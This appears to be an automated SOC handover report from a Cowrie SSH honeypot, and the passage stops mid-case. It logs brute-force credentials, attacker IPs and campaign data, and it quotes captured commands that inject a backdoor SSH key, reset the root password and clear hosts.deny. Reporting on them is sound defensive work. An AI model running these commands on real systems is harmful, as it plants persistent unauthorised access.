# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-30 |
| **Generated At** | 2026-04-30T06:31:50Z |
| **Shift Time** | 06:31 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **213** |
| Confirmed Threats | **208** |
| False Positives Filtered | **5** (2.4%) |
| Unique Attacker IPs | **27** |
| Countries of Origin | **11** |
| High Severity Cases | **13** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **200** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **76** |
| Unique Credential Pairs | **64** |
| Unique Usernames | **34** |
| Unique Passwords | **63** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 15 |
| `root` | 13 |
| `345gs5662d34` | 5 |
| `test` | 4 |
| `admin` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `Host: 13.235.92.17:23` | 2 |
| `Accept-Encoding: gzip` | 2 |
| `$4` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 2 |
| `*1` | `$4` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `mysql@123` | `101.126.11.137` | 2026-04-30T03:32:52 |
| `root` | `3245gs5662d34` | `101.126.11.137` | 2026-04-30T03:32:58 |
| `root` | `test1test` | `113.141.171.139` | 2026-04-30T04:02:42 |
| `root` | `oracle@123` | `113.141.171.139` | 2026-04-30T04:03:16 |
| `root` | `oracle@123` | `171.220.244.134` | 2026-04-30T04:11:54 |
| `root` | `admin001` | `171.220.244.134` | 2026-04-30T04:13:30 |
| `root` | `3245gs5662d34` | `171.220.244.134` | 2026-04-30T04:13:34 |
| `root` | `adminn` | `157.157.221.246` | 2026-04-30T04:43:17 |
| `root` | `3245gs5662d34` | `157.157.221.246` | 2026-04-30T04:43:21 |
| `root` | `adminlogin` | `106.51.92.114` | 2026-04-30T06:19:01 |
| `root` | `3245gs5662d34` | `106.51.92.114` | 2026-04-30T06:19:02 |
| `root` | `test2017` | `106.51.92.114` | 2026-04-30T06:21:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **213** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 128 |
| Go SSH scanner | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 86 | 8 |
| `af8223ac9914...` | libssh-based | 37 | 2 |
| `4e066189c3bb...` | Generic scanner | 1 | 1 |
| `dde267e50f82...` | Mirai/variant | 1 | 1 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 86 | 8 | Modern SSH client |
| `af8223ac9914...` | libssh | 37 | 2 | libssh-based |
| `95420f9d932d...` | libssh | 5 | 3 | — |
| `4e066189c3bb...` | Unknown | 1 | 1 | Generic scanner |
| `dde267e50f82...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:J2gzPrjB23In"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `171.220.244.134`, `113.141.171.139`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `171.220.244.134`, `106.51.92.114`, `101.126.11.137`, `157.157.221.246`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **27** |
| Unique ASNs | **23** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS28573` | Claro NXT Telecomunicacoes Ltda | 1 | HIGH |
| `AS1680` | Cellcom Fixed Line Communication L.P | 1 | HIGH |
| `AS134768` | CHINANET SHAANXI province Cloud Base network | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (13)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a9cc9204090c

| Field | Detail |
|---|---|
| **Source IP** | `101.126.11[.]137` |
| **First Seen** | 2026-04-30 03:32 |
| **Last Seen** | 2026-04-30 03:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 03:32:50` | `cowrie.session.connect` |
| `2026-04-30 03:32:50` | `cowrie.client.version` |
| `2026-04-30 03:32:51` | `cowrie.client.kex` |
| `2026-04-30 03:32:52` | `cowrie.login.success` |
| `2026-04-30 03:32:52` | `cowrie.session.params` |
| `2026-04-30 03:32:52` | `cowrie.command.input` |
| `2026-04-30 03:32:52` | `cowrie.command.failed` |
| `2026-04-30 03:32:53` | `cowrie.log.closed` |
| `2026-04-30 03:32:53` | `cowrie.session.params` |
| `2026-04-30 03:32:53` | `cowrie.command.input` |
| `2026-04-30 03:32:54` | `cowrie.session.file_download` |
| `2026-04-30 03:32:54` | `cowrie.log.closed` |
| `2026-04-30 03:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.11[.]137` to AbuseIPDB if not already reported
- [ ] Block `101.126.11[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25aa02e2bfa6

| Field | Detail |
|---|---|
| **Source IP** | `101.126.11[.]137` |
| **First Seen** | 2026-04-30 03:32 |
| **Last Seen** | 2026-04-30 03:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 03:32:56` | `cowrie.session.connect` |
| `2026-04-30 03:32:56` | `cowrie.client.version` |
| `2026-04-30 03:32:57` | `cowrie.client.kex` |
| `2026-04-30 03:32:58` | `cowrie.login.success` |
| `2026-04-30 03:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.11[.]137` to AbuseIPDB if not already reported
- [ ] Block `101.126.11[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-205ea80ea0fc

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-04-30 04:02 |
| **Last Seen** | 2026-04-30 04:03 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:J2gzPrjB23In"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 04:02:41` | `cowrie.session.connect` |
| `2026-04-30 04:02:41` | `cowrie.client.version` |
| `2026-04-30 04:02:41` | `cowrie.client.kex` |
| `2026-04-30 04:02:42` | `cowrie.login.success` |
| `2026-04-30 04:02:42` | `cowrie.session.params` |
| `2026-04-30 04:02:42` | `cowrie.command.input` |
| `2026-04-30 04:02:42` | `cowrie.command.failed` |
| `2026-04-30 04:02:42` | `cowrie.log.closed` |
| `2026-04-30 04:02:43` | `cowrie.session.params` |
| `2026-04-30 04:02:43` | `cowrie.command.input` |
| `2026-04-30 04:02:43` | `cowrie.session.file_download` |
| `2026-04-30 04:02:43` | `cowrie.log.closed` |
| `2026-04-30 04:02:55` | `cowrie.session.params` |
| `2026-04-30 04:02:55` | `cowrie.command.input` |
| `2026-04-30 04:02:55` | `cowrie.log.closed` |
| `2026-04-30 04:02:56` | `cowrie.session.params` |
| `2026-04-30 04:02:56` | `cowrie.command.input` |
| `2026-04-30 04:02:56` | `cowrie.log.closed` |
| `2026-04-30 04:02:56` | `cowrie.session.params` |
| `2026-04-30 04:02:56` | `cowrie.command.input` |
| `2026-04-30 04:02:56` | `cowrie.session.file_download` |
| `2026-04-30 04:02:56` | `cowrie.log.closed` |
| `2026-04-30 04:02:57` | `cowrie.session.params` |
| `2026-04-30 04:02:57` | `cowrie.command.input` |
| `2026-04-30 04:02:57` | `cowrie.log.closed` |
| `2026-04-30 04:02:57` | `cowrie.session.params` |
| `2026-04-30 04:02:57` | `cowrie.command.input` |
| `2026-04-30 04:02:57` | `cowrie.log.closed` |
| `2026-04-30 04:02:58` | `cowrie.session.params` |
| `2026-04-30 04:02:58` | `cowrie.command.input` |
| `2026-04-30 04:02:58` | `cowrie.command.input` |
| `2026-04-30 04:02:58` | `cowrie.log.closed` |
| `2026-04-30 04:02:58` | `cowrie.session.params` |
| `2026-04-30 04:02:58` | `cowrie.command.input` |
| `2026-04-30 04:02:58` | `cowrie.log.closed` |
| `2026-04-30 04:02:59` | `cowrie.session.params` |
| `2026-04-30 04:02:59` | `cowrie.command.input` |
| `2026-04-30 04:02:59` | `cowrie.log.closed` |
| `2026-04-30 04:02:59` | `cowrie.session.params` |
| `2026-04-30 04:02:59` | `cowrie.command.input` |
| `2026-04-30 04:03:00` | `cowrie.log.closed` |
| `2026-04-30 04:03:00` | `cowrie.session.params` |
| `2026-04-30 04:03:00` | `cowrie.command.input` |
| `2026-04-30 04:03:00` | `cowrie.log.closed` |
| `2026-04-30 04:03:00` | `cowrie.session.params` |
| `2026-04-30 04:03:00` | `cowrie.command.input` |
| `2026-04-30 04:03:01` | `cowrie.log.closed` |
| `2026-04-30 04:03:01` | `cowrie.session.params` |
| `2026-04-30 04:03:01` | `cowrie.command.input` |
| `2026-04-30 04:03:01` | `cowrie.log.closed` |
| `2026-04-30 04:03:02` | `cowrie.session.params` |
| `2026-04-30 04:03:02` | `cowrie.command.input` |
| `2026-04-30 04:03:02` | `cowrie.log.closed` |
| `2026-04-30 04:03:02` | `cowrie.session.params` |
| `2026-04-30 04:03:02` | `cowrie.command.input` |
| `2026-04-30 04:03:02` | `cowrie.log.closed` |
| `2026-04-30 04:03:03` | `cowrie.session.params` |
| `2026-04-30 04:03:03` | `cowrie.command.input` |
| `2026-04-30 04:03:03` | `cowrie.log.closed` |
| `2026-04-30 04:03:03` | `cowrie.session.params` |
| `2026-04-30 04:03:03` | `cowrie.command.input` |
| `2026-04-30 04:03:03` | `cowrie.log.closed` |
| `2026-04-30 04:03:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7a55f796134

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-04-30 04:03 |
| **Last Seen** | 2026-04-30 04:03 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:IlN9OyqvXqXG"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 04:03:16` | `cowrie.session.connect` |
| `2026-04-30 04:03:16` | `cowrie.client.version` |
| `2026-04-30 04:03:16` | `cowrie.client.kex` |
| `2026-04-30 04:03:16` | `cowrie.login.success` |
| `2026-04-30 04:03:17` | `cowrie.session.params` |
| `2026-04-30 04:03:17` | `cowrie.command.input` |
| `2026-04-30 04:03:17` | `cowrie.command.failed` |
| `2026-04-30 04:03:17` | `cowrie.log.closed` |
| `2026-04-30 04:03:17` | `cowrie.session.params` |
| `2026-04-30 04:03:17` | `cowrie.command.input` |
| `2026-04-30 04:03:17` | `cowrie.session.file_download` |
| `2026-04-30 04:03:17` | `cowrie.log.closed` |
| `2026-04-30 04:03:30` | `cowrie.session.params` |
| `2026-04-30 04:03:30` | `cowrie.command.input` |
| `2026-04-30 04:03:30` | `cowrie.log.closed` |
| `2026-04-30 04:03:30` | `cowrie.session.params` |
| `2026-04-30 04:03:30` | `cowrie.command.input` |
| `2026-04-30 04:03:30` | `cowrie.log.closed` |
| `2026-04-30 04:03:31` | `cowrie.session.params` |
| `2026-04-30 04:03:31` | `cowrie.command.input` |
| `2026-04-30 04:03:31` | `cowrie.session.file_download` |
| `2026-04-30 04:03:31` | `cowrie.log.closed` |
| `2026-04-30 04:03:31` | `cowrie.session.params` |
| `2026-04-30 04:03:31` | `cowrie.command.input` |
| `2026-04-30 04:03:31` | `cowrie.log.closed` |
| `2026-04-30 04:03:32` | `cowrie.session.params` |
| `2026-04-30 04:03:32` | `cowrie.command.input` |
| `2026-04-30 04:03:32` | `cowrie.log.closed` |
| `2026-04-30 04:03:32` | `cowrie.session.params` |
| `2026-04-30 04:03:32` | `cowrie.command.input` |
| `2026-04-30 04:03:32` | `cowrie.command.input` |
| `2026-04-30 04:03:33` | `cowrie.log.closed` |
| `2026-04-30 04:03:33` | `cowrie.session.params` |
| `2026-04-30 04:03:33` | `cowrie.command.input` |
| `2026-04-30 04:03:33` | `cowrie.log.closed` |
| `2026-04-30 04:03:33` | `cowrie.session.params` |
| `2026-04-30 04:03:33` | `cowrie.command.input` |
| `2026-04-30 04:03:34` | `cowrie.log.closed` |
| `2026-04-30 04:03:34` | `cowrie.session.params` |
| `2026-04-30 04:03:34` | `cowrie.command.input` |
| `2026-04-30 04:03:34` | `cowrie.log.closed` |
| `2026-04-30 04:03:35` | `cowrie.session.params` |
| `2026-04-30 04:03:35` | `cowrie.command.input` |
| `2026-04-30 04:03:35` | `cowrie.log.closed` |
| `2026-04-30 04:03:35` | `cowrie.session.params` |
| `2026-04-30 04:03:35` | `cowrie.command.input` |
| `2026-04-30 04:03:35` | `cowrie.log.closed` |
| `2026-04-30 04:03:36` | `cowrie.session.params` |
| `2026-04-30 04:03:36` | `cowrie.command.input` |
| `2026-04-30 04:03:36` | `cowrie.log.closed` |
| `2026-04-30 04:03:36` | `cowrie.session.params` |
| `2026-04-30 04:03:36` | `cowrie.command.input` |
| `2026-04-30 04:03:36` | `cowrie.log.closed` |
| `2026-04-30 04:03:37` | `cowrie.session.params` |
| `2026-04-30 04:03:37` | `cowrie.command.input` |
| `2026-04-30 04:03:37` | `cowrie.log.closed` |
| `2026-04-30 04:03:37` | `cowrie.session.params` |
| `2026-04-30 04:03:37` | `cowrie.command.input` |
| `2026-04-30 04:03:37` | `cowrie.log.closed` |
| `2026-04-30 04:03:38` | `cowrie.session.params` |
| `2026-04-30 04:03:38` | `cowrie.command.input` |
| `2026-04-30 04:03:38` | `cowrie.log.closed` |
| `2026-04-30 04:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77514cd4dd0f

| Field | Detail |
|---|---|
| **Source IP** | `171.220.244[.]134` |
| **First Seen** | 2026-04-30 04:11 |
| **Last Seen** | 2026-04-30 04:12 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:njOPEVRduM6I"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 04:11:53` | `cowrie.session.connect` |
| `2026-04-30 04:11:53` | `cowrie.client.version` |
| `2026-04-30 04:11:54` | `cowrie.client.kex` |
| `2026-04-30 04:11:54` | `cowrie.login.success` |
| `2026-04-30 04:11:55` | `cowrie.session.params` |
| `2026-04-30 04:11:55` | `cowrie.command.input` |
| `2026-04-30 04:11:55` | `cowrie.command.failed` |
| `2026-04-30 04:11:55` | `cowrie.log.closed` |
| `2026-04-30 04:11:55` | `cowrie.session.params` |
| `2026-04-30 04:11:55` | `cowrie.command.input` |
| `2026-04-30 04:11:55` | `cowrie.session.file_download` |
| `2026-04-30 04:11:55` | `cowrie.log.closed` |
| `2026-04-30 04:12:07` | `cowrie.session.params` |
| `2026-04-30 04:12:07` | `cowrie.command.input` |
| `2026-04-30 04:12:08` | `cowrie.log.closed` |
| `2026-04-30 04:12:08` | `cowrie.session.params` |
| `2026-04-30 04:12:08` | `cowrie.command.input` |
| `2026-04-30 04:12:08` | `cowrie.log.closed` |
| `2026-04-30 04:12:09` | `cowrie.session.params` |
| `2026-04-30 04:12:09` | `cowrie.command.input` |
| `2026-04-30 04:12:09` | `cowrie.session.file_download` |
| `2026-04-30 04:12:09` | `cowrie.log.closed` |
| `2026-04-30 04:12:09` | `cowrie.session.params` |
| `2026-04-30 04:12:09` | `cowrie.command.input` |
| `2026-04-30 04:12:09` | `cowrie.log.closed` |
| `2026-04-30 04:12:10` | `cowrie.session.params` |
| `2026-04-30 04:12:10` | `cowrie.command.input` |
| `2026-04-30 04:12:10` | `cowrie.log.closed` |
| `2026-04-30 04:12:10` | `cowrie.session.params` |
| `2026-04-30 04:12:10` | `cowrie.command.input` |
| `2026-04-30 04:12:10` | `cowrie.command.input` |
| `2026-04-30 04:12:10` | `cowrie.log.closed` |
| `2026-04-30 04:12:11` | `cowrie.session.params` |
| `2026-04-30 04:12:11` | `cowrie.command.input` |
| `2026-04-30 04:12:11` | `cowrie.log.closed` |
| `2026-04-30 04:12:11` | `cowrie.session.params` |
| `2026-04-30 04:12:11` | `cowrie.command.input` |
| `2026-04-30 04:12:11` | `cowrie.log.closed` |
| `2026-04-30 04:12:12` | `cowrie.session.params` |
| `2026-04-30 04:12:12` | `cowrie.command.input` |
| `2026-04-30 04:12:12` | `cowrie.log.closed` |
| `2026-04-30 04:12:12` | `cowrie.session.params` |
| `2026-04-30 04:12:12` | `cowrie.command.input` |
| `2026-04-30 04:12:12` | `cowrie.log.closed` |
| `2026-04-30 04:12:13` | `cowrie.session.params` |
| `2026-04-30 04:12:13` | `cowrie.command.input` |
| `2026-04-30 04:12:13` | `cowrie.log.closed` |
| `2026-04-30 04:12:13` | `cowrie.session.params` |
| `2026-04-30 04:12:13` | `cowrie.command.input` |
| `2026-04-30 04:12:13` | `cowrie.log.closed` |
| `2026-04-30 04:12:14` | `cowrie.session.params` |
| `2026-04-30 04:12:14` | `cowrie.command.input` |
| `2026-04-30 04:12:14` | `cowrie.log.closed` |
| `2026-04-30 04:12:14` | `cowrie.session.params` |
| `2026-04-30 04:12:14` | `cowrie.command.input` |
| `2026-04-30 04:12:14` | `cowrie.log.closed` |
| `2026-04-30 04:12:15` | `cowrie.session.params` |
| `2026-04-30 04:12:15` | `cowrie.command.input` |
| `2026-04-30 04:12:15` | `cowrie.log.closed` |
| `2026-04-30 04:12:15` | `cowrie.session.params` |
| `2026-04-30 04:12:15` | `cowrie.command.input` |
| `2026-04-30 04:12:15` | `cowrie.log.closed` |
| `2026-04-30 04:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.220.244[.]134` to AbuseIPDB if not already reported
- [ ] Block `171.220.244[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12a4201e0d44

| Field | Detail |
|---|---|
| **Source IP** | `171.220.244[.]134` |
| **First Seen** | 2026-04-30 04:13 |
| **Last Seen** | 2026-04-30 04:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
